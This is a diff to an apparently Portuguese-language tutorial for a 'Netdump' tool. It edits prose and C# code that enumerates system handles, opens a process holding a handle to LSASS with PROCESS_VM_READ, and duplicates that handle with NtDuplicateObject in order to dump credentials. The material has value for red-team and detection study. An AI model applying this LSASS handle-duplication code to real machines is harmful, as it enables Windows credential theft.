@@ -194,7 +194,7 @@ Netdump.Invokes.CloseHandle(handleEntryPtr);
 Netdump.Invokes.CloseHandle(systemInformationPtr);
 ```
 
-Agora que as informações que precisamos estão armazenadas no dicionário, precisamos criar um `foreach` para acessarmos elas de uma por uma. As informações que analisaremos são somente duas: PID e AccessRights.
+Agora que as informações que precisamos estão armazenadas no dicionário, precisamos criar um `foreach` para acessarmos elas de uma por uma. As informações que analisaremos são três: PID, AccessRights e `handleStruct.HandleValue`.
 
 - AccessRights: privilégios de acesso do handle. Buscamos por handles que contenham `PROCESS_VM_READ`.
 
@@ -281,7 +281,7 @@ uint acessDuplicate = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ; // setando pr
 IntPtr hRemoteProcess = Netdump.Invokes.OpenProcess((uint)acessOriginal, false, 6020); // abrindo um handle pro processo que contém o handle do LSASS
 if (hRemoteProcess == IntPtr.Zero) { throw new Exception($"[-] OpenProcess: {Marshal.GetLastWin32Error()}"); }
 
-IntPtr hObject = new IntPtr(handle.HandleValue);
+IntPtr hObject = new IntPtr(handleStruct.HandleValue); // o handleStruct.HandleValue é proveniente do SYSTEM_HANDLE_TABLE_ENTRY_INFO 
 
 Netdump.Tables.NTSTATUS result = Netdump.Invokes.NtDuplicateObject(
 	hRemoteProcess, // handle do processo alvo
